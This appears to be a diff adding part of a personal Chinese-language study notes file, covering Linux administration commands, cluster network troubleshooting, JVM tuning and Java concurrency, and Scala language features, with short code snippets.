+	Cpu(s):  0.1%us,  0.1%sy,  0.0%ni, 99.8%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%st
+	Mem:  99058496k total,  7560316k used, 91498180k free,   375880k buffers
+	Swap: 16777212k total,        0k used, 16777212k free,   772988k cached
+
+	  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                                                                          
+	 4802 root      20   0 29.9g 5.1g  31m S  1.3  5.4 212:53.30 java                                                                                                                              
+	 2331 root      20   0  185m 4576 3708 S  0.3  0.0  12:04.68 vmtoolsd                                                                                                                          
+	 9632 root      20   0 15152 1308  920 R  0.3  0.0   0:00.13 top      
+
+
+	kill命令的工作原理是，向Linux系统的内核发送一个系统操作信号和某个程序的进程标识号，然后系统内核就可以对进程标识号指定的进程进行操作。
+	kill -9 3233  //强制杀死 pid 为3233的进程 
+
+26. tar -zcvf xx.tar.gz xx
+	  tar -zxvf xx.tar.gz
+
+27. 查看swap被哪些进程使用了多大的空间
+    for i in `cd /proc;ls |grep "^[0-9]"|awk ' $0 >100'` ;do awk '/Swap:/{a=a+$2}END{print '"$i"',a/1024"M"}' /proc/$i/smaps ;done |sort -k2nr 
+
+28. 通过ps查看thriftserver进程id并杀掉
+    ps -ef | grep thriftserver | grep -v grep | awk '{print $2}' | xargs kill -9
+
+29. 查看eth0网卡的IP地址：ifconfig eth0 | awk -F '[ :]+' 'NR==2 {print $4}'
+    获取eth0的网卡号：route | grep '^default' | grep -o '[^ ]*$'
+
+30. sh脚本异常：/bin/sh^M:bad interpreter: No such file or directory
+    vim下利用如下命令修改文件格式 
+    :set ff=unix 或 :set fileformat=unix
+
+31. 想要Linux上电自动执行某个脚本，可以在/etc/rc.d/rc.local中添加sh /xx/xx.sh
+
+32. nohup可以将一个进程初始化为一个守护进程。 
+    nohup命令运行了另一个命令来阻断所有发送给该进程的SIGHUP信号，这会在退出终端会话时阻止进程退出。
+
+-----------------------------------Linux End-----------------------------------------
+
+
+-----------------------------------------集群网络-------------------------------------------------
+集群网络不通：
+	 （1）ping不通插在同一个路由上的其他机器
+		  网络配置或网卡问题。 请检查网络配置或更换网卡
+		  
+	 （2）可以ping通同一个路由上的其他机器，单ping不通自己网段的网管
+		  路由器上网线太多，产生路由回路，导致找不到网关，手动将网管的MAC地址写进去，执行命令
+		  arp -s 10.9.233.1 00:19:c6:03:b6:29
+		  
+	 （3）可以ping通自己的网管，单ping不通外网网关
+		  这中情况一般发生在大小网配置的服务器上。一般是由默认路由错误导致的。
+		  route 查看路由表
+		  [root@zdh-ict ~]# route -e
+		  Kernel IP routing table
+		  Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+		  10.9.233.0      *               255.255.255.0   U         0 0          0 eth1
+		  192.168.122.0   *               255.255.255.0   U         0 0          0 eth2
+		  link-local      *               255.255.0.0     U         0 0          0 eth1
+		  link-local      *               255.255.0.0     U         0 0          0 eth2
+		  default         192.168.122.1   0.0.0.0         UG        0 0          0 eth2
+		  可见默认路由是192.168.122.1，是小网的网管，所以ping不通外网网管。需要手动修改路由表，将10.9.233.1设为默认网管。
+		  route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.9.233.1   
+		  route del -net 0.0.0.0  gw 192.168.122.1
+		  
+		  [root@zdh-ict ~]# route
+		  Kernel IP routing table
+		  Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+		  10.9.233.0      *               255.255.255.0   U     0      0        0 eth1
+		  192.168.122.0   *               255.255.255.0   U     0      0        0 eth2
+		  link-local      *               255.255.0.0     U     1003   0        0 eth1
+		  link-local      *               255.255.0.0     U     1004   0        0 eth2
+		  default         10.9.233.1      0.0.0.0         UG    0      0        0 eth1
+
+	 （4）外网可以ping通，但自己ping不出去
+		  当前服务器配置的ip被别的机器占用，重新配置ip。
+-------------------------------------------------------------------------------------------
+
+--------------------------------------Java Begin-----------------------------------------
+
+1. Java内存与垃圾回收
+   http://www.importnew.com/14086.html
+   http://www.oracle.com/webfolder/technetwork/tutorials/obe/java/gc01/index.html
+
+   VM 开关  VM 开关描述
+  -Xms  设置JVM启动时堆的初始化大小。
+  -Xmx  设置堆最大值。
+  -Xmn  设置年轻代的空间大小，剩下的为老年代的空间大小。
+  -XX:PermGen 设置永久代内存的初始化大小。
+  -XX:MaxPermGen  设置永久代的最大值。
+  -XX:SurvivorRatio 提供Eden区和survivor区的空间比例。比如，如果年轻代的大小为10m并且VM开关是-XX:SurvivorRatio=2，那么将会保留5m内存给Eden区和每个Survivor区分配2.5m内存。默认比例是8。
+  -XX:NewRatio  提供年老代和年轻代的比例大小。默认值是2。
+
+2. Java垃圾回收类型
+   - Serial GC（-XX:+UseSerialGC）：Serial GC使用简单的标记、清除、压缩方法对年轻代和年老代进行垃圾回收，即Minor GC和Major GC。Serial GC在client模式（客户端模式）很有用，比如在简单的独立应用和CPU配置较低的机器。这个模式对占有内存较少的应用很管用。
+   - Parallel GC（-XX:+UseParallelGC）：除了会产生N个线程来进行年轻代的垃圾收集外，Parallel GC和Serial GC几乎一样。这里的N是系统CPU的核数。我们可以使用 -XX:ParallelGCThreads=n 这个JVM选项来控制线程数量。并行垃圾收集器也叫throughput收集器。因为它使用了多CPU加快垃圾回收性能。Parallel GC在进行年老代垃圾收集时使用单线程。
+   - Parallel Old GC（-XX:+UseParallelOldGC）：和Parallel GC一样。不同之处，Parallel Old GC在年轻代垃圾收集和年老代垃圾回收时都使用多线程收集。
+   - 并发标记清除（CMS）收集器（-XX:+UseConcMarkSweepGC)：CMS收集器也被称为短暂停顿并发收集器。它是对年老代进行垃圾收集的。CMS收集器通过多线程并发进行垃圾回收，尽量减少垃圾收集造成的停顿。CMS收集器对年轻代进行垃圾回收使用的算法和Parallel收集器一样。这个垃圾收集器适用于不能忍受长时间停顿要求快速响应的应用。可使用 -XX:ParallelCMSThreads=n JVM选项来限制CMS收集器的线程数量。
+   - G1垃圾收集器（-XX:+UseG1GC) G1（Garbage First）：垃圾收集器是在Java 7后才可以使用的特性，它的长远目标时代替CMS收集器。G1收集器是一个并行的、并发的和增量式压缩短暂停顿的垃圾收集器。G1收集器和其他的收集器运行方式不一样，不区分年轻代和年老代空间。它把堆空间划分为多个大小相等的区域。当进行垃圾收集时，它会优先收集存活对象较少的区域，因此叫“Garbage First”。你可以在Oracle Garbage-FIrst收集器文档找到更多详细信息。
+
+3. Java垃圾回收监控
+   - jstat  //命令行
+   - jvisualvm  //可视化
+
+4. Java中String的空间占用分析。http://www.ibm.com/developerworks/cn/java/j-lo-optmizestring/index.html
+
+5. jps -l -v | grep jetty  //查看主类全名(-l)包含jetty的HotSpot虚拟机进程及启动参数(-v)
+
+6. jstat -gcutil 70380  //查看HotSpot虚拟机进程号为70380的Java堆状况(以百分比的形式)
+
+7. jinfo -flag PermSize 70380  //查看HotSpot虚拟机进程号为70380的PermSize参数值
+   jinfo 70380  //查看HotSpot虚拟机进程号为70380的全部参数值
+
+8. jmap -heap  //显示Java堆详细信息，如使用哪种回收器、参数配置、分代状况
+
+9. JVM的GC日志的主要参数包括如下几个：
+  -XX:+PrintGC 输出GC日志
+  -XX:+PrintGCDetails 输出GC的详细日志
+  -XX:+PrintGCTimeStamps 输出GC的时间戳（以基准时间的形式）
+  -XX:+PrintGCDateStamps 输出GC的时间戳（以日期的形式，如 2013-05-04T21:53:59.234+0800）
+  -XX:+PrintHeapAtGC 在进行GC的前后打印出堆的信息
+  -Xloggc:gclog.log 日志文件的输出路径及文件名
+
+10. hs_err_pid9688.log  //VM日志文件名称
+
+11. 泛型 - 类型擦除
+
+12. 自动装箱与拆箱
+    装箱：数值类型 自动装载为 引用类型, Integer i = 123; (等价于Integer i = Integer.valueOf(123);)
+    拆箱：引用类型 自动拆开为 数值类型, int i = new Integer(100); (等价于new Integer(100).intValue();)
+
+    Integer.valueOf(1); 该方法基于减少对象创建次数和节省内存的考虑，其会缓存[-128, 127]之间的值。
+
+13. javap 反汇编器，可以把字节码*.class文件以字节码指令的形式输出。
+
+14. DJ Java Decompiler 该工具把*.class转化为对应的Java代码，常用来对比javac对Java代码做了哪些转化(一般为装拆箱、语法糖处理等)
+
+15. 1个字节等于8位二进制
+    1byte = 8 bit
+    1K = 1024byte = (1024 * 8)bit
+
+16. 集合类型
+    http://blog.csdn.net/quinnnorris/article/details/54895024
+    http://blog.csdn.net/quinnnorris/article/details/54969126
+
+    ArrayList和HashMap是异步，Vector和HashTable是同步(即是线程安全的)
+    从JDK源码中可以看到Vector的add/remove等方法有synchronized关键字修饰
+
+    Vector与ArrayList的比较：
+    从线程安全角度、随机访问的角度、新增/删除角度、默认增量大小角度
+
+    ArrayList与LinkedList比较：
+    ArrayList基于动态数据的List，LinkedList是基于双向链表的List
+    随机访问的角度、新增/删除角度
+
+    HashMap与TreeMap比较：
+    是否保持某种固定的顺序
+
+    ArrayList等集合遍历的三种方式：for循环、foreach遍历、迭代器
+
+    Map类遍历的四种方式：
+    对map.keySet()使用foreach；
+    对map.entrySet()使用迭代器；
+    对map.values()使用迭代器；
+    对map.entrySet()使用foreach遍历(推荐使用这种方式)
+
+    List<String> list = new ArrayList<String>();
+    list.add("abc");
+    list.add("xyz");
+    集合转数组：String[] array = list.toArray(new String[list.size()]);
+    数组转集合：Set<String> set1 = new HashSet<String>(Arrays.asList(array));
+
+    集合的算法操作(如排序，查找等)都封装在java.util.Collections类中，其算法都是静态方法，可以直接调用
+
+17. 泛型
+    - 泛型方法
+      public static <E> void printArray(E[] array) {
+        for (E element:array) {
+          System.out.printf("%s ", element);
+        }
+      }
+      <E>为泛型方法的声明，位于方法返回值的前面
+
+    - 带有界的类型参数
+      public static <T extends Comparable<T>> T getMaxNumber(T x, T y, T z) {
+        T max = x.compareTo(y) > 0 ? (x.compareTo(z) > 0 ? x : z) : y;
+        return max;
+      }
+
+    - 泛型类
+      public class Box<T> {
+        private T t;
+        public void add(T t) {
+            this.t = t;
+        }
+        public T get() {
+            return t;
+        }
+      }
+
+    - 类型通配符：使用?代替具体的类型参数，例如 List<?> 在逻辑上是List<String>>,List<Integer> 等所有List<具体类型实参>的父类。
+      public static void getData(List<?> data) {
+        System.out.println("data :" + data.get(0));
+      }
+
+      有上界的通配符, 使用extends
+      public static void getUperNumber(List<? extends Number> data) {
+        System.out.println("data :" + data.get(0));
+      }
+
+      有下界的通配符，使用super
+      public static void getUperNumber(List<? super Number> data) {
+        System.out.println("data :" + data.get(0));
+      }
+
+18. 多线程编程
+    - 实现多线程的三种方式
+     > 实现Runnable接口，并重写run方法
+     > 继承Thread类，并重写run方法
+     > 使用Callable和Future类
+
+    - 定时执行某个线程
+      Executors.newSingleThreadScheduledExecutor.scheduleAtFixedRate(...)
+
+19. Java 8 新特性
+    - Lambda，使用符号 ->
+      interface MathOperation { int operation(int a, int b); }
+      // 有类型声明
+      MathOperation addition = (int a, int b) -> a + b;
+      // 不用类型声明
+      MathOperation subtraction = (a, b) -> a - b;
+      // 大括号中的返回语句
+      MathOperation multiplication = (int a, int b) -> {return a * b;};
+      // 没有大括号及返回语句
+      MathOperation division = (int a, int b) -> a / b;
+
+    - 函数式接口
+      就是一个具有一个方法的普通接口，可以被隐式转换为lambda表达式
+      java.util.function 它包含了很多类，用来支持 Java的 函数式编程
+      private static <T> void eval(List<T> list, Predicate<T> predicate) {
+        for (T elem: list) {
+            if (predicate.test(elem)) {
+                System.out.println(elem);
+            }
+        }
+      }
+      List<Integer> list = Arrays.asList(1, 2, 3, 4, 5, 6);
+      eval(list, x -> x % 2 ==0);
+
+    - 方法引用
+      方法引用通过方法的名字来指向一个方法。
+      方法引用可以使语言的构造更紧凑简洁，减少冗余代码。
+      方法引用使用一对冒号(::)。
+      List<String> list = new ArrayList<String>();
+      list.add("a");
+      list.add("b");
+      list.add("c");
+      list.forEach(System.out::print);
+
+    - 默认方法
+      默认方法作为库、框架向前兼容的手段。
+      默认方法就是接口可以有实现方法，而且不需要实现类去实现其方法。
+      只需在方法名前面加个default关键字即可实现默认方法。
+      interface Vehicle {
+        //默认方法
+        default void print() {
+          System.out.println("我是一辆车.");
+        }
+        //Java8中，interface中允许定义静态方法
+        static void blowHorn() {
+          System.out.println("按喇叭.");
+        }
+      }
+
+    - Stream
+      +--------------------+       +------+   +------+   +---+   +-------+
+      | stream of elements +-----> |filter+-> |sorted+-> |map+-> |collect|
+      +--------------------+       +------+   +------+   +---+   +-------+
+      List<Integer> transactionsIds = 
+        widgets.stream()
+                     .filter(b -> b.getColor() == RED)
+                     .sorted((x,y) -> x.getWeight() - y.getWeight())
+                     .mapToInt(Widget::getWeight)
+                     .sum();
+      在 Java 8 中, 集合接口有两个方法来生成流：
+        stream() − 为集合创建串行流。
+        parallelStream() − 为集合创建并行流。
+
+    - Optional类
+      Optional 类是一个可以为null的容器对象。如果值存在则isPresent()方法会返回true，调用get()方法会返回该对象。
+      Optional 是个容器：它可以保存类型T的值，或者仅仅保存null。Optional提供很多有用的方法，这样我们就不用显式进行空值检测。
+      Optional 类的引入很好的解决空指针异常。
+
+      Integer i = null;
+      Optional<Integer> oi =  Optional.ofNullable(i); //Optional.ofNullable()可以传入null值
+      oi.isPresent();  //若oi是null,返回false,否则返回true
+      oi.orElse(0);  //若oi为null值，则返回传入的参数0
+
+20. 反射
+    有对象获取类的类信息，以及类的成员函数、成员变量、构造器以及类加载器
+    可以实现运行时动态加载
+
+21. 设计模式
+    - 观察者模式，Observable类、Observer接口
+    - 工厂模式/抽象工厂模式
+    - 适配器模式
+    - 命令模式
+    - 代理模式/动态代理(InvocationHandler，Proxy.newProxyInstance(...))
+    - 策略模式
+
+
+22. Java序列化
+    - java.io.Serializable
+    - ObjectOutputStream  writeObject
+    - ObjectInputStream  readObject
+
+    private transient String telephone;
+    private static final long serialVersionUID = 1L;
+    序列化并不保存静态变量，因为序列化保存的是对象的状态，静态变量属于类的状态
+    要想将父类对象也序列化，就需要让父类也实现Serializable接口。如果父类不实现的话的，就需要有默认的无参的构造函数。
+
+23. Java死锁
+    - 解决方案：使用Semaphore信号量
+    semaphore.tryAcquire(1, TimeUnit.SECONDS)  //获取一个许可
+    semaphore.release()  //释放一个许可
+
+24. System.out.printf()和System.out.format()方法模仿自C的printf，可以格式化字符串，两者是完全等价的。
+    String.format()方法参考了C中的sprintf()方法，以生成格式化的String对象，是一个static方法，它接受与Formatter.format()方法一样的参数，但返回一个String对象。
+
+25. Java的同步机制
+    - volatile关键字(最轻量级)
+    - synchronized关键字(最常用，简单)
+    - Lock接口(功能强大，加锁后需要手动释放)
+
+25. //volatile与synchronized的区别
+    1.volatile本质是在告诉jvm当前变量在寄存器中的值是不确定的,需要从主存中读取,synchronized则是锁定当前变量,只有当前线程可以访问该变量,其他线程被阻塞住.
+    2.volatile仅能使用在变量级别,synchronized则可以使用在变量,方法.
+    3.volatile仅能实现变量的修改可见性,但不具备原子特性,而synchronized则可以保证变量的修改可见性和原子性.
+    4.volatile不会造成线程的阻塞,而synchronized可能会造成线程的阻塞.
+    5.volatile标记的变量不会被编译器优化,而synchronized标记的变量可以被编译器优化.
+
+26. Java提供两种锁机制
+    - synchronized：在软件层面依赖JVM，JVM自动管理锁，包括加锁与释放锁
+    - java.util.concurrent.Lock接口：在硬件层面依赖特殊的CPU指令，加锁后需要手动释放该锁，但效率更好
+
+    java.util.concurrent.Lock和synchronized的选择  http://www.cnblogs.com/dolphin0520/p/3923167.html
+　　总结来说，Lock和synchronized有以下几点不同：
+　　1）Lock是一个接口，而synchronized是Java中的关键字，synchronized是内置的语言实现；
+　　2）synchronized在发生异常时，会自动释放线程占有的锁，因此不会导致死锁现象发生；而Lock在发生异常时，如果没有主动通过unLock()去释放锁，则很可能造成死锁现象，因此使用Lock时需要在finally块中释放锁；
+　　3）Lock可以让等待锁的线程响应中断，而synchronized却不行，使用synchronized时，等待的线程会一直等待下去，不能够响应中断；
+　　4）通过Lock可以知道有没有成功获取锁，而synchronized却无法办到。
+　　5）Lock可以提高多个线程进行读操作的效率。
+　　在性能上来说，如果竞争资源不激烈，两者的性能是差不多的，而当竞争资源非常激烈时（即有大量线程同时竞争），此时Lock的性能要远远优于synchronized。所以说，在具体使用时要根据适当情况选择。
+
+    Scala并发：http://twitter.github.io/scala_school/concurrency.html
+
+27. java.util.concurrent.Lock
+    Lock lock = new ReentrantLock()  //非公平锁
+    Lock lock = new ReentrantLock(true)  //公平锁
+    lock.lock()  //获取锁，会一直等待
+    lock.tryLock()  //尝试获取锁，返回boolean
+    lock.lockInterruptibly()  //可中断锁，等待锁的过程中可被中断
+
+    /**ReentrantReadWriteLock里面提供了很多丰富的方法, 不过最主要的有两个方法：readLock()和writeLock()用来获取读锁和写锁。*/
+    ReadWriteLock rwl = new ReentrantReadWriteLock();
+
+    锁的类别：
+    - 可重入锁(指在同一个线程内)
+    - 等待可中断锁
+    - 公平锁
+    - 读写锁
+
+28. Java访问权限修饰词：public、protected(继承访问权限)、包访问权限（默认访问权限，有时也称friendly）和private。
+
+29. Java内存模型在并发过程中的3个特征：
+    - 原子性：可由Synchronized关键字或者java.util.concurrent.Lock接口保证
+    - 可见性：volatile/synchronized/final都能保证可见性，以及java.util.concurrent.Lock接口
+    - 有序性：volatile/synchronized关键字，以及java.util.concurrent.Lock接口都能保证有序性
+
+30. synchronized关键字需要一个reference类型的参数来指明要锁定和解锁的对象
+    如果Java程序中的synchronized明确指定了对象参数，那就是这个对象的reference;
+    如果没有明确指定，那就根据synchronized修饰的是实例方法还是类方法，去取对应的对象实例或Class对象来作为锁对象
+    public class Test {
+      //synchronized修饰类方法
+      public static synchronized void method-1(){} 
+      //synchronized修饰实例方法
+      public synchronized void method-2(){}
+    }
+
+31. 在以下情况，JVM隐含地执行了同步，不需要自己使用synchronized来加互斥锁进行同步控制
+    1. 有静态初始化器(在静态字段上或static{}块中的初始化器)初始化数据时
+    2. 访问final字段时
+    3. 在创建线程之前创建对象时
+    4. 线程可以看见它将要处理的对象时
+
+32. 实现单例模式的5种方式：
+    - 饿汉式
+    - 懒汉式
+    - 双重检测锁 (不推荐，实现麻烦，Java1.5前无法很好支持)
+    - IoDH以静态内部类方式实现 (推荐) 「1.延迟加载；2.无需加锁，JVM保证线程安全」
+    - 以枚举方式实现 (极推荐)「1.线程安全；2.防止反序列化而产生新实例；3.防止反射攻击(由java.lang.reflect.Constructor的newInstance()方法识别并抛出异常来禁止了通过反射构造枚举对象)」
+
+33. 类级内部类指的是，有「static」修饰的成员式内部类。如果没有static修饰的成员式内部类被称为对象级内部类。
+　　类级内部类相当于其外部类的static成分，它的对象与外部类对象间不存在依赖关系，因此可直接创建。而对象级内部类的实例，是绑定在外部对象实例中的。
+　　类级内部类中，可以定义静态的方法。在静态方法中只能够引用外部类中的静态成员方法或者成员变量。
+　　类级内部类相当于其外部类的成员，只有在「第一次」被使用的时候才被会装载。
+
+    class Singleton_6 {
+      private Singleton_6() {}
+
+      /**通过静态内部类创建单实例**/
+      /**
+       * 类级的内部类，也就是静态的成员式内部类，该内部类的实例与外部类的实例
+       * 没有绑定关系，而且只有被调用时才会装载，从而实现了延迟加载
+       */
+      private static class HolderClass {
+          /**静态初始化器，由JVM来保证线程安全*/
+          private final static Singleton_6 instance = new Singleton_6();
+      }
+      public static Singleton_6 getInstance() {
+          return HolderClass.instance;
+      }
+    }
+
+34. 枚举：一种特殊的类，可以包含成员变量和成员方法，但构造器不能是public的
+
+
+--------------------------------------Java End-----------------------------------------
+
+--------------------------------------Scala Begin-----------------------------------------
+
+1. scala中方法(method, 使用 def 定义)与函数(function, 使用 => 定义)的区别 
+	- 方法不能单独存在(参数为空的方法除外)；函数可以(此时仅表示函数对象本身), 函数实际上是functionX类的对象.
+    def method_1: Unit = { println("execute method_1") }
+    def method_2(x: Int): Unit = { println(x) }
+    def fun_1 = method_1 _
+    def fun_2 = method_2 _ 
+    val fun = (x: Int) => println(x)
+  - 函数必须要有参数列表，而方法可以没有参数列表
+    val fun =  => println("execute function") //没有参数
+    val fun = () => println("execute function") //参数为空
+    def fun = () => println("execute function") //参数为空
+    val f = fun //work
+    def method_1: Unit = { println("execute method_1") }
+    def method_1(): Unit = { println("execute method_1") }
+  - 在需要函数的地方，如果传递一个方法，会自动进行ETA展开(把方法转换为函数)
+    def method_2(x: Int): Unit = { println(x) }
+    (1 to 10).foreach( method_2 )
+    (1 to 10).foreach( method_2 _ )
+
+	REPL中
+	1、定义一个方法：def square(x: Int) = x * x
+		它的响应为：square (x: Int) Int
+	2、定义一个函数：val triple = (x: Int) => x * 3
+		它的响应为：triple: Int => Int
+	square _ 表示把方法 square 转换为函数。
+
+2. 所有的能够yield(产生)结果的for表达式都会被编译器转译为高阶方法map, flatMap及filter的组合调用；
+	所有的不带yield的for循环都会被转译为仅对高阶函数filter和foreach的调用。
+
+  //for表达式以生成器开始
+  for {
+    p <- persons  //生成器
+    name = p.name //定义
+    if (name.startsWith("P")) //过滤器(守卫)
+  } yield name
+
+3. scala中的下划线 P29 http://stackoverflow.com/questions/8000903/what-are-all-the-uses-of-an-underscore-in-scala
+	- 通配符，类似Java中的*
+    import scala.collection.mutable._
+  - 隐藏方法
+    import java.util.{HashMap => _}
+  - 占位，表示某一类型的默认值
+    > 对于数值类型
+      var str: Int = _   // 0
+      var str: Double = _   // 0.0
+    > 对于引用类型
+      var str: String = _   // null
+      var str: List[Int] = _   // null
+  - 指代集合中的元素
+    (1 to 10).filter(_ % 2 == 0)
+  - 在元组中，可以用方法_1, _2, _3访问组员
+    ("Peter", 20)._1 
+    ("Peter", 20)._2
+  - 忽略某元组组员
+    val (name, age, _) = ("Peter", 20, "student")
+    val _ = 10
+  - 变量名或方法名中连接字母与标点符号 ($除外,$用于伴生对象的实现)
+    def bang_!(x: Int) = println(x)
+    val test_> = 10
+  - :_*作为一个整体, 将某个参数当作参数序列处理
+    def sum(nums: Int*): Int = nums.sum
+    val s = sum(1 to 5:_*)
+  - 模式匹配中
+    Some(5) match { case Some(_) => println("Yes") }
+    (1 to 10) match { case Seq(head, tail @ _*) => tail.foreach(println) }
+    (1 to 1) match { case Seq(head, _*) => head }
+  - 偏应用函数 or 偏函数应用 ?
+    (1 to 10).foreach( println(_) )
+  - ETA展开，跟在方法名后表示把该方法转换为函数
+    > def fun(x: Int): Unit = { println(x) }
+      val funLike = fun
+    > 对具有一个参数的方法进行ETA展开
+      (1 to 10).foreach( println _ )
+      (1 to 10).foreach( x => println(x) )
+      对具有两个参数的方法进行ETA展开
+      def method_f(f: (Int, Int) => Int): Int = f(1, 2) + 100
+      def method_add(x: Int, y: Int): Int = x + y
+      method_f(method_add _) //实际上，scala编译器会自动进行ETA展开，_ 可以不写。
+  - 下划线指代 matcher 中的 String 入参
+  	private def filesHere = (new java.io.File(".")).listFiles
+  	def filesMatching(matcher: (String) => Boolean) = {
+  		for (file <- filesHere; if matcher(file.getName)) yield file
+  	}
+  	def filesEnding(query: String) = filesMatching(_.endsWith(query))  // 下划线 _ 指代是什么？
+  	def filesContaining(query: String) = filesMatching(_.contains(query))
+  - 存在类型
+
+
+
+4. 样例类(或样例对象)与普通类(或普通对象的区别) http://stackoverflow.com/questions/5270752/difference-between-case-object-and-object
+	- pattern matching support (模式匹配支持)
+	- default implementations of equals and hashCode ('equals'和'hashCode'的不同实现)
+	- default implementations of serialization (样例类/对象支持序列化，普通类/对象不支持)
+	- a prettier default implementation of toString, and (toString函数实现不同)
+	- the small amount of functionality that they get from automatically inheriting from scala.Product.
+
+5. final class X
+	final修饰的类X不能被其他继承
+
+6. 单例类型: v.type, 只有两个可能的值：v 和 null. (P260)
+	- this.type 表示为哪个对象调用就返回哪个对象的引用，不由scala自己进行所执行方法的类型推断
+	- def set(obj: Title.type): ... Title指代的是单例对象，而不是类型，因此不等于def set(obj: Title)
+
+7. 尾递归 (P206)
+	- 在它们最后一个动作调用自己的函数，被称为尾递归：tail recursive. 
+	- scala编译器检测到尾递归就用新值更新函数参数，然后把它替换成一个回到函数开头的跳转
+	- @tailrec注解, 被注解的方法必须在object内，或者被声明为private或final
+	- 「蹦床」一个消除递归更加通用的机制
+	- 递归：def length: Int = if (isEmpty) 0 else 1 + tail.length
+	- 尾递归：def length(len: Int = 0): Int = if (isEmpty) len else tail.length(1 + len)
+
+8. for表达式实现八皇后问题
+	def queens(n: Int): List[List[(Int, Int)]] = {
+	  def placeQueens(row: Int): List[List[(Int, Int)]] = {
+	    if (row == 0) List(List())
+	    else
+	      for {
+	        queens <- placeQueens(row - 1)
+	        column <- 1 to n
+	        queen = (row, column)
+	        if isSafe(queen, queens)
+	      } yield queen :: queens
+	  }
+	  placeQueens(n)
+	}
+	def isSafe(queen: (Int, Int), queens: List[(Int, Int)]) = queens.forall(q => !inCheck(queen, q))
+	def inCheck(q1: (Int, Int), q2: (Int, Int)) = q1._1 == q2._1 || q1._2 == q2._2 || (q1._1 - q2._1).abs == (q1._2 - q2._2).abs
+
+9. 集合类型 
+  Iterable
+  |—— Seq: 有先后次序的序列, 使用 +: 或者 :+ 添加元素
+  |—— Set：无先后次序的值， 使用 + 添加元素
+  |—— Map：一组(键，值)对偶
+
+  列表相关操作
+	- def contains(elem: Any): Boolean	检测列表中是否包含指定的元素
+	- def exists(p: (A) => Boolean): Boolean	判断列表中指定条件的元素是否存在
+	- def forall(p: (A) => Boolean): Boolean	检测所有元素是否都满足条件
+	折叠操作 (集合类中大多数的高阶函数都可以用折叠操作来实现)
+	- def fold[A1 >: A](z: A1)(op: (A1, A1) => A1): A1
+	- def foldRight[B](z: B)(op: (A, B) => B): B
+	- def foldLeft[B](z: B)(op: (B, A) => B): B
+  滑动操作(silding), size为窗口大小，step为滑动步长
+  - def sliding(size: Int): collection.Iterator[Array[T]]
+  - def sliding(size: Int, step: Int): collection.Iterator[Array[T]]
+  条件操作
+  - final def dropWhile(p: (A) => Boolean): List[A]
+  - final def takeWhile(p: (A) => Boolean): List[A]
+  拼接
+  - list ::: List(3) //把元素3拼接到list的末尾
+	- (3 :: list.reverse).reverse //和上述效果一致
+  找个最大编码的字母的下标
+  - "abcdefzgshd".toList.zipWithIndex.max._2
+
+  迭代器
+  不常用，但对于那些完整构造需要很大开销的集合而言，迭代器就派上用场。
+  如：Source.fromFile产出一个迭代器，是因为将整个文件都读到内存可能并不是很高效。
+  注意：迭代器只能迭代一次，当迭代器移动到集合的末尾时，迭代器将不能再使用。
+  - while (iter.hasNext) 对iter.next()执行某种操作
+  - for (elem <- iter) 对elem执行某种操作
+
+  流
+  是一个尾部被懒计算的不可变列表。
+  可以实现迭代器的功能，是迭代器「不可变」的替代品。
+  迭代器不会缓存访问过的值，每个值只能访问一次；而流将缓存访问过的值，允许重新访问。
+  - val words = Source.fromFile("xxx").getLines.toStream
+  - words.take(5).force
+  - def numsFrom(n: BigInt): Stream[BigInt] = n #:: numsFrom(n + 1)  // #::操作符用于操作流，类似列表的::操作符。
+
+  视图
+  连第一个元素都被懒计算
+  不缓存任何值，每次调用都需要重新计算
+  强制求值(force)后，得到的是相同类型的新集合
+  - val powers = (0 until 100).view.map(pow(10, _))
+  - (0 to 1000).view.map(pow(10, _)).map(1 / _).force  //产出一个记住了两个map操作的视图，当求值动作被强制执行时，对于每个元素，这两个操作被同时执行，不需要额外构建中间集合
+
+  线程安全的集合
+  Scala类库提供了六个特质，用以混入集合，可以让集合的操作变成同步的：
+  SynchronizedBuffer / SynchronizedMap / SynchronizedPriorityQueue / SynchronizedQueue / SynchronizedSet / SynchronizedStack
+  - val scores new mutable.HashMap[String, Int] with mutable.SynchronizedMap[String, Int]
+  - scala内置的线程安全的映射(Map)
+    scala.collection.concurrent.Map
+    scala.collection.concurrent.TrieMap
+
+  并行集合
+  - for (i <- (0 until 10).par) print(i + " ")  // 乱序
+  - for (i <- (0 until 10).par) yield i + " "   // 正序，for/yield循环中，结果是依次组装的。par方法返回的并行集合的类型为扩展自ParSeq、ParSet或ParMap类型。
+  - 如果并行运算修改了共享的变量，则结果无法预知
+    var count = 0
+    for (c <- coll.par) { if (c % 2 == 0) count += 1}  //错误,不应该是并行集合中使用共享变量
+
+  Map
+  - collection.imutable.SortedMap()  //已排序映射，所有插入的值都会按key排序
+  - collection.mutable.LinkedHashMap()  //链式哈希映射，该映射保留插入的顺序
+  val wordMap = collection.imutable.SortedMap.empty[String, Int]  //创建一个空的已排序映射
+
+  Map("a" -> "asdf").get("b").orNull  //要么返回key,要么返回"null"; orNull只适用于AnyRef的子类型，如String
+
+10. ETA: http://hongjiang.info/eta-conversion-and-eta-expansion/
+	- 把 x => func(x) 简化为 func _ 或 func 的过程称为 eta-conversion
+	- 把 func 或 func _ 展开为 x => func(x) 的过程为 eta-expansion
+	- foo _ 这里的占位符相当于所有的参数，不仅仅是单个参数，即 (x,y) => foo(x,y) 里的x，y都被"_"替代
+	- 对于 foo _ 这种写法，编译器会严格按照部分应用函数来对待，把foo方法封装成一个函数对象。
+    而对于后边不带下划线foo这种写法，编译器还要看上下文，判断究竟是对其调用求值，还是进行eta转换。
+
+11. Nothing，Null，None，Nil
+	- Nothing是所有类型的子类，也是Null的子类。Nothing没有对象，但是可以用来定义类型。
+    例如，如果一个方法抛出异常，则异常的返回值类型就是Nothing(虽然不会返回) 。
+	- Null是所有AnyRef的子类，在scala的类型系统中，AnyRef是Any的子类，同时Any子类的还有AnyVal。null是Null的唯一对象(实例)。
+	- None是一个object，是Option的子类型。
+	- Nil是一个空的List，定义为List[Nothing]，根据List的定义List[+A]，所有Nil是所有List[T]的子类。
+
+12. Scala允许在类里定义一个特殊函数apply, 当把对象当作函数处理的时候，apply函数就会被调用。
+  - 如：
+    val arr: Array[Int] = Array(1, 2, 3)
+    arr(1) 等价于 arr.apply(1) //Scala语言访问数组元素是函数调用，不是特殊操作符，所以使用圆括号，与Python不一样
+
